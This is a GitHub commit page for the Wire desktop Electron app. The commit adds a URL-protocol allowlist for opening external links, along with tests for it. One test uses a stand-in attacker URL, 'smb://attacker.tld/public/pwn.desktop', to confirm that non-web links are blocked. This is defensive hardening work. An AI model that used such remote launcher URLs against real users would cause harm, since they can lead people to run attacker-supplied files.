[View file](/wireapp/wire-desktop/blob/b3705fffa75a03f055530f55a754face5ac0623b/electron/src/lib/showDialog.ts)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -18,6 +18,7 @@ |
|  |  | \*/ |
|  |  |  |
|  |  | import {dialog, MessageBoxSyncOptions} from 'electron'; |
|  |  | import \* as locale from '../locale/locale'; |
|  |  |  |
|  |  | export const showDialog = (message: string, title: string, type?: string): void => { |
|  |  | const options: MessageBoxSyncOptions = { |
| Expand All | | @@ -31,3 +32,13 @@ export const showDialog = (message: string, title: string, type?: string): void |
|  |  | export const showErrorDialog = (message: string): void => { |
|  |  | showDialog(message, 'Error', 'error'); |
|  |  | }; |
|  |  |  |
|  |  | export const showWarningDialog = (message: string): void => { |
|  |  | const options: MessageBoxSyncOptions = { |
|  |  | buttons: ['OK'], |
|  |  | message, |
|  |  | title: 'Warning', |
|  |  | type: 'warning', |
|  |  | }; |
|  |  | dialog.showMessageBoxSync(options); |
|  |  | }; |

5 changes: 2 additions & 3 deletions

5
[electron/src/main.ts](#diff-89f2871212092c5c0c2dcba947155968f89d41326697ad43bcc4b95e71e78fca "electron/src/main.ts")

Show comments

[View file](/wireapp/wire-desktop/blob/b3705fffa75a03f055530f55a754face5ac0623b/electron/src/main.ts)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -28,7 +28,6 @@ import { |
|  |  | ipcMain, |
|  |  | Menu, |
|  |  | OnHeadersReceivedListenerDetails, |
|  |  | shell, |
|  |  | WebContents, |
|  |  | } from 'electron'; |
|  |  | import \* as fs from 'fs-extra'; |
| Expand Down  Expand Up | | @@ -264,7 +263,7 @@ const showMainWindow = async (mainWindowState: windowStateKeeper.State): Promise |
|  |  | return; |
|  |  | } |
|  |  |  |
|  |  | await shell.openExternal(url); |
|  |  | return WindowUtil.openExternal(url); |
|  |  | }); |
|  |  |  |
|  |  | main.on('focus', () => { |
| Expand Down  Expand Up | | @@ -507,7 +506,7 @@ class ElectronWrapperInit { |
|  |  | } |
|  |  |  |
|  |  | this.logger.log('Opening an external window from a webview.'); |
|  |  | return shell.openExternal(url); |
|  |  | return WindowUtil.openExternal(url); |
|  |  | }; |
|  |  |  |
|  |  | const willNavigateInWebview = (event: ElectronEvent, url: string, baseUrl: string): void => { |
| Expand Down | |  |

13 changes: 7 additions & 6 deletions

13
[electron/src/menu/system.ts](#diff-024822c002938256ba7bcf9dbb70c332f8e63216e5ffec6fb4e4d9017bf71418 "electron/src/menu/system.ts")

Show comments

[View file](/wireapp/wire-desktop/blob/b3705fffa75a03f055530f55a754face5ac0623b/electron/src/menu/system.ts)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -18,7 +18,7 @@ |
|  |  | \*/ |
|  |  |  |
|  |  | import autoLaunch = require('auto-launch'); |
|  |  | import {dialog, globalShortcut, ipcMain, Menu, MenuItemConstructorOptions, shell} from 'electron'; |
|  |  | import {dialog, globalShortcut, ipcMain, Menu, MenuItemConstructorOptions} from 'electron'; |
|  |  | import \* as path from 'path'; |
|  |  |  |
|  |  | import {EVENT\_TYPE} from '../lib/eventType'; |
| Expand All | | @@ -33,6 +33,7 @@ import {SettingsType} from '../settings/SettingsType'; |
|  |  | import {WindowManager} from '../window/WindowManager'; |
|  |  | import {downloadLogs} from '../lib/download'; |
|  |  | import {zipFiles, createFile} from '../lib/zip'; |
|  |  | import \* as WindowUtil from '../window/WindowUtil'; |
|  |  |  |
|  |  | const launchCmd = process.env.APPIMAGE || process.execPath; |
|  |  |  |
| Expand Down  Expand Up | | @@ -251,23 +252,23 @@ const helpTemplate: MenuItemConstructorOptions = { |
|  |  | role: 'help', |
|  |  | submenu: [ |
|  |  | { |
|  |  | click: () => shell.openExternal(config.legalUrl), |
|  |  | click: () => WindowUtil.openExternal(config.legalUrl, true), |
|  |  | label: locale.getText('menuLegal'), |
|  |  | }, |
|  |  | { |
|  |  | click: () => shell.openExternal(config.privacyUrl), |
|  |  | click: () => WindowUtil.openExternal(config.privacyUrl, true), |
|  |  | label: locale.getText('menuPrivacy'), |
|  |  | }, |
|  |  | { |
|  |  | click: () => shell.openExternal(config.licensesUrl), |
|  |  | click: () => WindowUtil.openExternal(config.licensesUrl, true), |
|  |  | label: locale.getText('menuLicense'), |
|  |  | }, |
|  |  | { |
|  |  | click: () => shell.openExternal(config.supportUrl), |
|  |  | click: () => WindowUtil.openExternal(config.supportUrl, true), |
|  |  | label: locale.getText('menuSupport'), |
|  |  | }, |
|  |  | { |
|  |  | click: () => shell.openExternal(EnvironmentUtil.web.getWebsiteUrl()), |
|  |  | click: () => WindowUtil.openExternal(EnvironmentUtil.web.getWebsiteUrl(), true), |
|  |  | label: locale.getText('menuAppURL'), |
|  |  | }, |
|  |  | downloadLogsTemplate, |
| Expand Down | |  |

20 changes: 13 additions & 7 deletions

20
[electron/src/window/AboutWindow.ts](#diff-ed4c6fc19b999dbf7ce00e72c0818605ebb809d5ecc5dde46bda63ee44f9734e "electron/src/window/AboutWindow.ts")

Show comments

[View file](/wireapp/wire-desktop/blob/b3705fffa75a03f055530f55a754face5ac0623b/electron/src/window/AboutWindow.ts)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -17,7 +17,7 @@ |
|  |  | \* |
|  |  | \*/ |
|  |  |  |
|  |  | import {app, BrowserWindow, ipcMain, session, shell} from 'electron'; |
|  |  | import {app, BrowserWindow, ipcMain, session} from 'electron'; |
|  |  | import fileUrl = require('file-url'); |
|  |  | import \* as path from 'path'; |
|  |  |  |
| Expand All | | @@ -26,6 +26,7 @@ import \* as locale from '../locale/locale'; |
|  |  | import \* as EnvironmentUtil from '../runtime/EnvironmentUtil'; |
|  |  | import {config} from '../settings/config'; |
|  |  | import {getLogger} from '../logging/getLogger'; |
|  |  | import \* as WindowUtil from '../window/WindowUtil'; |
|  |  |  |
|  |  | const logger = getLogger(path.basename(\_\_filename)); |
|  |  |  |
| Expand Down  Expand Up | | @@ -89,14 +90,19 @@ const showWindow = async () => { |
|  |  | if (ABOUT\_WINDOW\_ALLOWLIST.includes(url)) { |
|  |  | return callback({cancel: false}); |
|  |  | } |
|  |  | }); |
|  |  |  |
|  |  | // Handle the new window event in the About Window |
|  |  | aboutWindow.webContents.on('new-window', (event, url) => { |
|  |  | event.preventDefault(); |
|  |  |  |
|  |  | // Open HTTPS links in browser instead |
|  |  | if (url.startsWith('https://')) { |
|  |  | await shell.openExternal(url); |
|  |  | } else { |
|  |  | logger.info(`Attempt to open URL "${url}" in window prevented.`); |
|  |  | callback({redirectURL: ABOUT\_HTML}); |
|  |  | // Ensure the link does not come from a webview |
|  |  | if (typeof (event as any).sender.viewInstanceId !== 'undefined') { |
|  |  | logger.log('New window was created from a webview, aborting.'); |
|  |  | return; |
|  |  | } |
|  |  |  |
|  |  | return WindowUtil.openExternal(url, true); |
|  |  | }); |
|  |  |  |
|  |  | // Locales |
| Expand Down | |  |

73 changes: 73 additions & 0 deletions

73
[electron/src/window/WindowUtil.test.ts](#diff-19736879ee4d476b29b78d47ca72f2a255255e7b0c26616c7c0cc3feb0537846 "electron/src/window/WindowUtil.test.ts")

Show comments

[View file](/wireapp/wire-desktop/blob/b3705fffa75a03f055530f55a754face5ac0623b/electron/src/window/WindowUtil.test.ts)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -0,0 +1,73 @@ |
|  |  | /\* |
|  |  | \* Wire |
|  |  | \* Copyright (C) 2020 Wire Swiss GmbH |
|  |  | \* |
|  |  | \* This program is free software: you can redistribute it and/or modify |
|  |  | \* it under the terms of the GNU General Public License as published by |
|  |  | \* the Free Software Foundation, either version 3 of the License, or |
|  |  | \* (at your option) any later version. |
|  |  | \* |
|  |  | \* This program is distributed in the hope that it will be useful, |
|  |  | \* but WITHOUT ANY WARRANTY; without even the implied warranty of |
|  |  | \* MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the |
|  |  | \* GNU General Public License for more details. |
|  |  | \* |
|  |  | \* You should have received a copy of the GNU General Public License |
|  |  | \* along with this program. If not, see http://www.gnu.org/licenses/. |
|  |  | \* |
|  |  | \*/ |
|  |  |  |
|  |  | import {dialog, shell} from 'electron'; |
|  |  | import \* as assert from 'assert'; |
|  |  | import \* as sinon from 'sinon'; |
|  |  |  |
|  |  | import \* as WindowUtil from './WindowUtil'; |
|  |  |  |
|  |  | describe('WindowUtil', () => { |
|  |  | describe('openExternal', () => { |
|  |  | let dialogStub: sinon.SinonStub; |
|  |  | let shellStub: sinon.SinonStub; |
|  |  |  |
|  |  | beforeEach(() => { |
|  |  | shellStub = sinon.stub(shell, 'openExternal').returns(Promise.resolve()); |
|  |  | dialogStub = sinon.stub(dialog, 'showMessageBoxSync').returns(0); |
|  |  | }); |
|  |  |  |
|  |  | afterEach(() => { |
|  |  | dialogStub.restore(); |
|  |  | shellStub.restore(); |
|  |  | }); |
|  |  |  |
|  |  | it('opens secure URLs externally', async () => { |
|  |  | const url = 'https://github.com/wireapp/wire-desktop'; |
|  |  | await WindowUtil.openExternal(url); |
|  |  |  |
|  |  | assert.ok(shellStub.firstCall.calledWith(url)); |
|  |  | assert.ok(dialogStub.notCalled); |
|  |  | }); |
|  |  |  |
|  |  | it('opens insecure URLs externally if allowed', async () => { |
|  |  | const url = 'http://github.com/wireapp/wire-desktop'; |
|  |  | await WindowUtil.openExternal(url, false); |
|  |  |  |
|  |  | assert.ok(shellStub.firstCall.calledWith(url)); |
|  |  | assert.ok(dialogStub.notCalled); |
|  |  | }); |
|  |  |  |
|  |  | it(`doesn't open insecure URLs externally if not allowed`, async () => { |
|  |  | const url = 'http://example.org'; |
|  |  | await WindowUtil.openExternal(url, true); |
|  |  |  |
|  |  | assert.ok(shellStub.notCalled); |
|  |  | assert.ok(dialogStub.called); |
|  |  | }); |
|  |  |  |
|  |  | it(`doesn't open non-website URLs externally`, async () => { |
|  |  | const url = 'smb://attacker.tld/public/pwn.desktop'; |
|  |  | await WindowUtil.openExternal(url); |
|  |  |  |
|  |  | assert.ok(shellStub.notCalled); |
|  |  | assert.ok(dialogStub.called); |
|  |  | }); |
|  |  | }); |
|  |  | }); |

30 changes: 29 additions & 1 deletion

30
[electron/src/window/WindowUtil.ts](#diff-cb8e8a126bf93099f523a6e716ca03e2570634940c9b0231c35c738e9e0cdb44 "electron/src/window/WindowUtil.ts")

Show comments

[View file](/wireapp/wire-desktop/blob/b3705fffa75a03f055530f55a754face5ac0623b/electron/src/window/WindowUtil.ts)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -17,7 +17,14 @@ |
|  |  | \* |
|  |  | \*/ |
|  |  |  |
|  |  | import {BrowserWindow, screen} from 'electron'; |
|  |  | import {BrowserWindow, screen, shell} from 'electron'; |
|  |  | import \* as path from 'path'; |
|  |  | import \* as URL from 'url'; |
|  |  |  |
|  |  | import {getLogger} from '../logging/getLogger'; |
|  |  | import {showWarningDialog} from '../lib/showDialog'; |
|  |  |  |
|  |  | const logger = getLogger(path.basename(\_\_filename)); |
|  |  |  |
|  |  | interface Rectangle { |
|  |  | height: number; |
| Expand Down  Expand Up | | @@ -46,3 +53,24 @@ export const isInView = (win: BrowserWindow): boolean => { |
|  |  |  |
|  |  | return upperLeftVisible || lowerRightVisible; |
|  |  | }; |
|  |  |  |
|  |  | export const openExternal = async (url: string, httpsOnly: boolean = false): Promise<void> => { |
|  |  | try { |
|  |  | const urlProtocol = URL.parse(url).protocol || ''; |
|  |  | const allowedProtocols = ['https:']; |
|  |  |  |
|  |  | if (!httpsOnly) { |
|  |  | allowedProtocols.push('ftp:', 'http:', 'mailto:'); |
|  |  | } |
|  |  |  |
|  |  | if (!allowedProtocols.includes(urlProtocol)) { |
|  |  | logger.warn(`Prevented opening external URL "${url}".`); |
|  |  | showWarningDialog(`Prevented opening external URL "${url}".`); |
|  |  | return; |
|  |  | } |
|  |  |  |
|  |  | await shell.openExternal(url); |
|  |  | } catch (error) { |
|  |  | logger.error(error); |
|  |  | } |
|  |  | }; |

10 changes: 0 additions & 10 deletions

10
[yarn.lock](#diff-51e4f558fae534656963876761c95b83b6ef5da5103c4adef6768219ed76c2de "yarn.lock")

Show comments

[View file](/wireapp/wire-desktop/blob/b3705fffa75a03f055530f55a754face5ac0623b/yarn.lock)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -5345,16 +5345,6 @@ fs-extra-p@^8.0.2: |
|  |  | bluebird-lst "^1.0.9" |
|  |  | fs-extra "^8.1.0" |
|  |  |  |
|  |  | fs-extra@9.0.0: |
|  |  | version "9.0.0" |
|  |  | resolved "https://registry.npmjs.org/fs-extra/-/fs-extra-9.0.0.tgz#b6afc31036e247b2466dc99c29ae797d5d4580a3" |
|  |  | integrity sha512-pmEYSk3vYsG/bF651KPUXZ+hvjpgWYw/Gc7W9NFUe3ZVLczKKWIij3IKpOrQcdw4TILtibFslZ0UmR8Vvzig4g== |
|  |  | dependencies: |
|  |  | at-least-node "^1.0.0" |
|  |  | graceful-fs "^4.2.0" |
|  |  | jsonfile "^6.0.1" |
|  |  | universalify "^1.0.0" |
|  |  |  |
|  |  | fs-extra@9.0.1, fs-extra@^9.0.0, fs-extra@^9.0.1: |
|  |  | version "9.0.1" |
|  |  | resolved "https://registry.npmjs.org/fs-extra/-/fs-extra-9.0.1.tgz#910da0062437ba4c39fedd863f1675ccfefcb9fc" |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `b3705ff`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fwireapp%2Fwire-desktop%2Fcommit%2Fb3705fffa75a03f055530f55a754face5ac0623b) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


